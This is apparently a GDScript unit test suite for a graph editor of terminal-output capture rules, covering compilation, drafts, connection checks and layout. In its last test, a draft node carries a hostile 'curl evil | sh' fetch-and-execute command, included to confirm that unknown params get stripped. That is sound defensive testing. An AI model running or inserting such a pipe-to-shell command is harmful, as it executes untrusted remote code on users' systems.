extends GutTest
# Unit tests for ConceptGraphModel — canvas construction, structural analysis,
# compile/minimal-override diff, drafts, and layout serialization. Pure static
# logic: no scene tree, no FFI (the regex validator is injected).

const NAME := "cat_command"
const TRIGGER := "(?:^|[$#>]\\s)\\bcat\\s+\\S"

func _accept(_pattern: String) -> String:
	return ""

func _reject_bad(pattern: String) -> String:
	return "look-around is not supported" if pattern == "bad" else ""

func _defaults() -> Array:
	return [{
		"name": NAME,
		"trigger": TRIGGER,
		"enabled": true,
		"capture_mode": "until_stop",
		"stop_timeout_ms": 300,
		"stop_on_input": true,
		"actions": [{"target": "code_viewer"}],
	}]

func _analyze(
	nodes: Array,
	edges: Array,
	defaults: Array = [],
	opened_defaults: Array = [],
	validator: Callable = Callable()
) -> Dictionary:
	if not validator.is_valid():
		validator = Callable(self, "_accept")
	return ConceptGraphModel.analyze(nodes, edges, defaults, opened_defaults, validator)

func _find(nodes: Array, id: String) -> Dictionary:
	for node in nodes:
		if node["id"] == id:
			return node
	return {}

## A user-authored rule, in the shape `_compile` writes.
func _user_rule(rule_name: String, trigger: String) -> Dictionary:
	return {
		"name": rule_name, "trigger": trigger, "enabled": true,
		"capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		"actions": [{"target": "code_viewer"}],
	}

## A compiled path with its canvas node ids — what [method ConceptGraphModel.rule_order]
## reads to sort rules.
func _ordered_path(rule_name: String) -> Dictionary:
	return {
		"name": rule_name, "trigger": "x",
		"node_ids": {
			"trigger": rule_name + "#t",
			"conditions": [],
			"action": rule_name + "#a",
		},
	}

# ── Canvas construction ────────────────────────────────────────────────

func test_build_canvas_materializes_a_chain_per_concept():
	var concepts := [{
		"name": "build_log",
		"trigger": "cargo build",
		"enabled": false,
		"capture_mode": "until_stop",
		"stop_timeout_ms": 2000,
		"stop_on_input": true,
		"conditions": ["error", "warning"],
		"actions": [{"target": "code_viewer"}],
	}]
	var canvas := ConceptGraphModel.build_canvas(concepts, {})
	var nodes: Array = canvas["nodes"]
	assert_eq(nodes.size(), 4, "trigger + two conditions + action")
	assert_eq(nodes[0]["id"], "build_log#t")
	assert_eq(nodes[0]["kind"], "trigger")
	assert_eq(nodes[0]["params"]["enabled"], false)
	assert_eq(nodes[1]["id"], "build_log#c0")
	assert_eq(nodes[1]["params"]["pattern"], "error")
	assert_eq(nodes[3]["id"], "build_log#a")
	assert_eq(nodes[3]["params"]["mode"], "until_stop")
	assert_eq(nodes[3]["params"]["target"], "code_viewer")
	var edges: Array = canvas["edges"]
	assert_eq(edges.size(), 3, "chain edges only")
	assert_eq(edges[0], ["build_log#t", "build_log#c0"])
	assert_eq(edges[2], ["build_log#c1", "build_log#a"])

func test_build_canvas_keeps_stored_positions_and_places_the_rest():
	var concepts := _defaults()
	var stored := {"positions": {NAME + "#t": [640, 480]}}
	var canvas := ConceptGraphModel.build_canvas(concepts, stored)
	var positions: Dictionary = canvas["positions"]
	assert_eq(positions[NAME + "#t"], [640.0, 480.0], "stored position is kept")
	assert_true(positions.has(NAME + "#a"), "unpositioned nodes get auto-layout")
	assert_ne(positions[NAME + "#t"], positions[NAME + "#a"], "auto-layout separates nodes")

func test_build_canvas_restores_drafts_with_their_positions():
	var graph := {
		"positions": {"draft:2": [10.0, 20.0]},
		"drafts": [{
			"nodes": [{"id": "draft:1", "kind": "gadget", "params": {}}],
			"edges": [],
		}, {
			"nodes": [{"id": "draft:2", "kind": "trigger", "params": {"name": "wip", "trigger": "x", "enabled": true}}],
			"edges": [],
		}],
	}
	var canvas := ConceptGraphModel.build_canvas([], graph)
	var nodes: Array = canvas["nodes"]
	assert_eq(nodes.size(), 1, "unknown kinds are dropped")
	assert_eq(nodes[0]["id"], "draft:2")
	assert_eq(canvas["positions"]["draft:2"], [10.0, 20.0])

# ── Analyze: valid rules ───────────────────────────────────────────────

func test_analyze_compiles_trigger_conditions_and_action():
	# Start from the shipped chain, then add one condition by hand (as the
	# editor does when the user wires a condition between trigger and action).
	var canvas := ConceptGraphModel.build_canvas(_defaults(), {})
	var nodes: Array = canvas["nodes"]
	var edges: Array = canvas["edges"]
	var condition := {"id": "cond1", "kind": "condition", "params": {"pattern": "FAILED"}}
	nodes.append(condition)
	edges[0] = [NAME + "#t", "cond1"]
	edges.append(["cond1", NAME + "#a"])

	var result := _analyze(nodes, edges, _defaults())
	assert_eq(result["errors"].size(), 0, str(result["errors"]))
	assert_eq(result["paths"].size(), 1)
	var entry: Dictionary = result["concepts"][0]
	assert_eq(entry["conditions"], ["FAILED"])
	assert_eq(entry["trigger"], TRIGGER)
	assert_eq(entry["actions"][0]["target"], "code_viewer")

func test_analyze_untouched_default_writes_no_user_entry():
	var canvas := ConceptGraphModel.build_canvas(_defaults(), {})
	var result := _analyze(canvas["nodes"], canvas["edges"], _defaults(), [NAME])
	assert_eq(result["errors"].size(), 0, str(result["errors"]))
	assert_eq(result["concepts"].size(), 0,
		"an unedited shipped rule must keep following the default, not freeze a copy")

func test_analyze_edited_default_writes_a_full_entry():
	var canvas := ConceptGraphModel.build_canvas(_defaults(), {})
	var nodes: Array = canvas["nodes"]
	_find(nodes, NAME + "#t")["params"]["trigger"] = "custom"
	var result := _analyze(nodes, canvas["edges"], _defaults(), [NAME])
	assert_eq(result["concepts"].size(), 1)
	var entry: Dictionary = result["concepts"][0]
	assert_eq(entry["name"], NAME)
	assert_eq(entry["trigger"], "custom")
	assert_eq(entry["capture_mode"], "until_stop")
	assert_eq(entry["actions"][0]["target"], "code_viewer")

func test_analyze_deleted_default_writes_a_tombstone():
	var result := _analyze([], [], _defaults(), [NAME])
	assert_eq(result["concepts"].size(), 1)
	assert_eq(result["concepts"][0], {"name": NAME, "enabled": false})

func test_analyze_deleted_user_rule_leaves_no_trace():
	# A name that is not a shipped default has nothing to tombstone: deleting
	# it simply removes the entry.
	var result := _analyze([], [], [], [NAME])
	assert_eq(result["concepts"].size(), 0,
		"a user rule that is not a shipped default has no tombstone")

func test_analyze_notify_rule_compiles_without_actions():
	var concepts := [{
		"name": "notify_me", "trigger": "boom", "enabled": true,
		"capture_mode": "single_line", "actions": [],
	}]
	var canvas := ConceptGraphModel.build_canvas(concepts, {})
	var result := _analyze(canvas["nodes"], canvas["edges"])
	assert_eq(result["errors"].size(), 0, str(result["errors"]))
	var entry: Dictionary = result["concepts"][0]
	assert_eq(entry["capture_mode"], "single_line")
	assert_false(entry.has("actions"), "notify-only rules route nowhere")

func test_analyze_rule_order_follows_canvas_order():
	var concepts := [
		{"name": "second", "trigger": "b", "enabled": true, "capture_mode": "until_stop",
		 "stop_timeout_ms": 300, "stop_on_input": true, "actions": [{"target": "code_viewer"}]},
		{"name": "first", "trigger": "a", "enabled": true, "capture_mode": "until_stop",
		 "stop_timeout_ms": 300, "stop_on_input": true, "actions": [{"target": "code_viewer"}]},
	]
	var canvas := ConceptGraphModel.build_canvas(concepts, {})
	var result := _analyze(canvas["nodes"], canvas["edges"])
	var names := []
	for entry in result["concepts"]:
		names.append(entry["name"])
	assert_eq(names, ["second", "first"], "user-file precedence order is preserved")

# ── Analyze: invalid content becomes a draft, never a bad concept ──────

func _user_concept(rule_name: String) -> Array:
	return [{
		"name": rule_name, "trigger": "x", "enabled": true,
		"capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		"actions": [{"target": "code_viewer"}],
	}]

func test_analyze_invalid_trigger_regex_keeps_the_rule_as_a_draft():
	var canvas := ConceptGraphModel.build_canvas(_user_concept("user_rule"), {})
	var nodes: Array = canvas["nodes"]
	_find(nodes, "user_rule#t")["params"]["trigger"] = "bad"
	var result := _analyze(nodes, canvas["edges"], [], [], Callable(self, "_reject_bad"))
	assert_eq(result["concepts"].size(), 0, "a rule the engine would drop must not compile")
	assert_eq(result["drafts"].size(), 1)
	assert_eq(result["drafts"][0]["nodes"].size(), 2, "trigger + action survive as a draft")
	assert_gt(result["errors"].size(), 0)
	assert_true(str(result["errors"][0]["message"]).contains("Trigger regex"), str(result["errors"]))

func test_analyze_trigger_without_action_is_reported_and_kept_as_a_draft():
	var canvas := ConceptGraphModel.build_canvas(_user_concept("user_rule"), {})
	var nodes: Array = canvas["nodes"]
	nodes.erase(_find(nodes, "user_rule#a"))
	var result := _analyze(nodes, canvas["edges"])
	assert_eq(result["concepts"].size(), 0)
	assert_eq(result["drafts"].size(), 1)
	assert_eq(result["drafts"][0]["nodes"][0]["id"], "user_rule#t")
	assert_gt(result["errors"].size(), 0)
	assert_true(str(result["errors"][0]["message"]).contains("user_rule"), str(result["errors"]))

func test_analyze_broken_chain_disables_the_shipped_rule():
	# Deleting part of a shipped rule's chain means the canvas no longer has
	# that rule: saving writes the same tombstone the manual editor writes, so
	# the shipped rule stops running until it is rebuilt.
	var canvas := ConceptGraphModel.build_canvas(_defaults(), {})
	var nodes: Array = canvas["nodes"]
	nodes.erase(_find(nodes, NAME + "#a"))
	var result := _analyze(nodes, canvas["edges"], _defaults(), [NAME])
	assert_eq(result["concepts"].size(), 1)
	assert_eq(result["concepts"][0], {"name": NAME, "enabled": false})

func test_analyze_duplicate_names_invalidate_every_rule_with_that_name():
	var nodes := [
		{"id": "a#t", "kind": "trigger", "params": {"name": "dup", "trigger": "x", "enabled": true}},
		{"id": "a#a", "kind": "action", "params": {"mode": "until_stop", "target": "code_viewer", "stop_timeout_ms": 300, "stop_on_input": true}},
		{"id": "b#t", "kind": "trigger", "params": {"name": "dup", "trigger": "y", "enabled": true}},
		{"id": "b#a", "kind": "action", "params": {"mode": "until_stop", "target": "code_viewer", "stop_timeout_ms": 300, "stop_on_input": true}},
	]
	var edges := [["a#t", "a#a"], ["b#t", "b#a"]]
	var result := _analyze(nodes, edges)
	assert_eq(result["concepts"].size(), 0)
	assert_eq(result["drafts"].size(), 2)
	assert_eq(result["errors"].size(), 2, "one message per duplicated rule")

func test_analyze_condition_cap_is_enforced():
	var concepts := [{
		"name": "wide", "trigger": "x", "enabled": true, "capture_mode": "until_stop",
		"stop_timeout_ms": 300, "stop_on_input": true,
		"conditions": ["a", "b", "c", "d", "e", "f", "g", "h", "i"],
		"actions": [{"target": "code_viewer"}],
	}]
	var canvas := ConceptGraphModel.build_canvas(concepts, {})
	var result := _analyze(canvas["nodes"], canvas["edges"])
	assert_eq(result["concepts"].size(), 0)
	assert_gt(result["errors"].size(), 0)

func test_analyze_shared_action_is_refused():
	var nodes := [
		{"id": "t1", "kind": "trigger", "params": {"name": "one", "trigger": "x", "enabled": true}},
		{"id": "t2", "kind": "trigger", "params": {"name": "two", "trigger": "y", "enabled": true}},
		{"id": "shared", "kind": "action", "params": {"mode": "until_stop", "target": "code_viewer", "stop_timeout_ms": 300, "stop_on_input": true}},
	]
	var edges := [["t1", "shared"], ["t2", "shared"]]
	var result := _analyze(nodes, edges)
	assert_eq(result["concepts"].size(), 0)
	assert_eq(result["drafts"].size(), 1, "the whole conflicted component is one draft")
	assert_gt(result["errors"].size(), 0)

func test_analyze_chain_cycle_is_refused():
	var nodes := [
		{"id": "t", "kind": "trigger", "params": {"name": "loop", "trigger": "x", "enabled": true}},
		{"id": "c1", "kind": "condition", "params": {"pattern": "a"}},
		{"id": "c2", "kind": "condition", "params": {"pattern": "b"}},
	]
	var edges := [["t", "c1"], ["c1", "c2"], ["c2", "c1"]]
	var result := _analyze(nodes, edges)
	assert_eq(result["concepts"].size(), 0)
	assert_gt(result["errors"].size(), 0)

# ── Connection validation ──────────────────────────────────────────────

func _wire_nodes() -> Array:
	return [
		{"id": "t", "kind": "trigger", "params": {"name": "r", "trigger": "x", "enabled": true}},
		{"id": "c", "kind": "condition", "params": {"pattern": "a"}},
		{"id": "a", "kind": "action", "params": {"mode": "until_stop", "target": "code_viewer", "stop_timeout_ms": 300, "stop_on_input": true}},
	]

func test_can_connect_allows_chain_wires():
	assert_eq(ConceptGraphModel.can_connect(_wire_nodes(), [], "t", "c"), "")
	assert_eq(ConceptGraphModel.can_connect(_wire_nodes(), [], "c", "a"), "")
	assert_eq(ConceptGraphModel.can_connect(_wire_nodes(), [], "t", "a"), "")

func test_can_connect_refuses_kind_violations():
	assert_ne(ConceptGraphModel.can_connect(_wire_nodes(), [], "a", "c"), "",
		"an action has no output")
	assert_ne(ConceptGraphModel.can_connect(_wire_nodes(), [], "c", "t"), "",
		"a trigger has no input")

func test_can_connect_refuses_occupied_ports():
	var edges := [["t", "c"], ["c", "a"]]
	assert_ne(ConceptGraphModel.can_connect(_wire_nodes(), edges, "t", "a"), "",
		"a trigger's one outgoing wire is already taken")
	assert_ne(ConceptGraphModel.can_connect(_wire_nodes(), edges, "c", "a"), "",
		"a condition's one outgoing wire is already taken")
	assert_ne(ConceptGraphModel.can_connect(_wire_nodes(), edges, "t", "c"), "",
		"c already has an input")

func test_can_connect_refuses_cycles():
	# An illegal pre-existing wire (a condition feeding back into a trigger)
	# is enough for the forward walk to find the loop when the user tries to
	# close it: t → c would complete c → t → c.
	var nodes := [
		{"id": "t", "kind": "trigger", "params": {"name": "r", "trigger": "x", "enabled": true}},
		{"id": "c", "kind": "condition", "params": {"pattern": "a"}},
	]
	var edges := [["c", "t"]]
	var reason := ConceptGraphModel.can_connect(nodes, edges, "t", "c")
	assert_ne(reason, "")
	assert_true(reason.contains("cycle"), reason)

# ── Layout ─────────────────────────────────────────────────────────────

func test_layout_rekeys_positions_when_a_rule_is_renamed():
	var canvas := ConceptGraphModel.build_canvas(_defaults(), {})
	var nodes: Array = canvas["nodes"]
	_find(nodes, NAME + "#t")["params"]["name"] = "renamed"
	var result := _analyze(nodes, canvas["edges"], _defaults(), [NAME])
	assert_eq(result["concepts"].size(), 2, "the renamed rule plus a tombstone for the old name")
	assert_eq(result["concepts"][0]["name"], "renamed")
	assert_eq(result["concepts"][1], {"name": NAME, "enabled": false})
	var graph := ConceptGraphModel.layout(result["paths"], canvas["positions"], result["drafts"])
	var positions: Dictionary = graph["positions"]
	assert_true(positions.has("renamed#t"), "positions follow the new rule name")
	assert_true(positions.has("renamed#a"))
	assert_false(positions.has(NAME + "#t"), "the stale key is not written")
	assert_eq(graph["order"], ["renamed"],
		"the order names the rule it will be saved as, not the name it had")

func test_layout_writes_the_rule_order_from_canvas_rows():
	var concepts := [_user_rule("first", "a"), _user_rule("second", "b")]
	var canvas := ConceptGraphModel.build_canvas(concepts, {})
	# Drag "second" above "first": rows are the precedence order, not just
	# layout, so the saved order follows the canvas.
	canvas["positions"][ConceptGraphModel.trigger_id("second")] = [40.0, 40.0]
	canvas["positions"][ConceptGraphModel.trigger_id("first")] = [40.0, 280.0]
	var result := _analyze(canvas["nodes"], canvas["edges"])
	var graph := ConceptGraphModel.layout(result["paths"], canvas["positions"], result["drafts"])
	assert_eq(graph["order"], ["second", "first"],
		"the saved order is the one the canvas shows")

func test_rule_order_keeps_unarranged_rules_last():
	var paths := [
		_ordered_path("one"),
		_ordered_path("two"),
	]
	# Only "two" has been placed; the canvas has never shown "one".
	assert_eq(ConceptGraphModel.rule_order(paths, {"two#t": [10.0, 20.0]}), ["two", "one"],
		"a rule the canvas has not arranged must not displace an arranged one")

func test_rule_order_breaks_a_row_tie_left_to_right():
	var paths := [_ordered_path("right"), _ordered_path("left")]
	var positions := {"right#t": [400.0, 40.0], "left#t": [40.0, 40.0]}
	assert_eq(ConceptGraphModel.rule_order(paths, positions), ["left", "right"],
		"two rules on one row read left to right")

func test_unarranged_rules_are_placed_below_arranged_ones():
	# A rule the canvas has never shown (a newly shipped default) must not land
	# on top of a row the user arranged: it goes below them, which is where the
	# merge order tries it too.
	var concepts := [_user_rule("arranged", "a"), _user_rule("brand_new", "b")]
	var stored := {
		"arranged#t": [40.0, 40.0],
		"arranged#a": [400.0, 40.0],
	}
	var canvas := ConceptGraphModel.build_canvas(concepts, {"positions": stored})
	assert_gt(canvas["positions"]["brand_new#t"][1], stored["arranged#t"][1],
		"an unarranged rule is placed after the arranged rows")

func test_tidy_positions_re_rows_the_canvas_in_its_order():
	var concepts := [_user_rule("first", "a"), _user_rule("second", "b")]
	var canvas := ConceptGraphModel.build_canvas(concepts, {})
	canvas["positions"][ConceptGraphModel.trigger_id("second")] = [40.0, 40.0]
	canvas["positions"][ConceptGraphModel.trigger_id("first")] = [40.0, 280.0]
	var result := _analyze(canvas["nodes"], canvas["edges"])
	var tidied := ConceptGraphModel.tidy_positions(
		result["paths"], result["drafts"], canvas["positions"]
	)
	assert_lt(tidied["second#t"][1], tidied["first#t"][1],
		"tidying keeps the order the canvas already had")
	assert_gt(tidied["second#a"][0], tidied["second#t"][0],
		"a chain still reads left to right")

func test_layout_caps_draft_nodes():
	var drafts := [{"nodes": [], "edges": []}]
	for i in 300:
		drafts[0]["nodes"].append({"id": "d%d" % i, "kind": "condition", "params": {"pattern": "x"}})
	var graph := ConceptGraphModel.layout([], {}, drafts)
	var count := 0
	for chain in graph["drafts"]:
		count += chain["nodes"].size()
	assert_lte(count, ConceptGraphModel.MAX_DRAFT_NODES)

func test_layout_keeps_draft_params_through_the_closed_key_set():
	var drafts := [{
		"nodes": [{
			"id": "d1", "kind": "trigger",
			"params": {"name": "wip", "trigger": "x", "enabled": true, "cmd": "curl evil | sh"},
		}],
		"edges": [],
	}]
	var graph := ConceptGraphModel.layout([], {"d1": [5, 6]}, drafts)
	var node: Dictionary = graph["drafts"][0]["nodes"][0]
	assert_false(node["params"].has("cmd"), "unknown params never survive a round-trip")
	assert_eq(graph["positions"]["d1"], [5.0, 6.0])
